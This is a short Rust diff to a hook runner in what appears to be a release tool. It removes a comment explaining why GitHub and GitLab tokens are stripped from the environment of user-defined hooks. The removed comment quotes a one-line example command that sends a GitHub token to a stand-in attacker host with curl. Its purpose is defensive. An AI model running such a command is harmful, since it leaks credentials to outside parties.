@@ -35,12 +35,6 @@ pub fn run_hook(
 
     let mut cmd = build_command(command);
     cmd.current_dir(working_dir)
-        // Bot mode (FERRFLOW_BOT=true) sets GITHUB_TOKEN / FERRFLOW_TOKEN
-        // process-wide so the OIDC-issued installation token reaches git
-        // subprocesses. Hooks are user-defined arbitrary shell — strip
-        // the tokens from their env so a hook can't `curl evil.com -d
-        // $GITHUB_TOKEN`. Hooks that explicitly need a token must opt in
-        // by reading from a different env var the user injects manually.
         .env_remove("GITHUB_TOKEN")
         .env_remove("FERRFLOW_TOKEN")
         .env_remove("GITLAB_TOKEN")
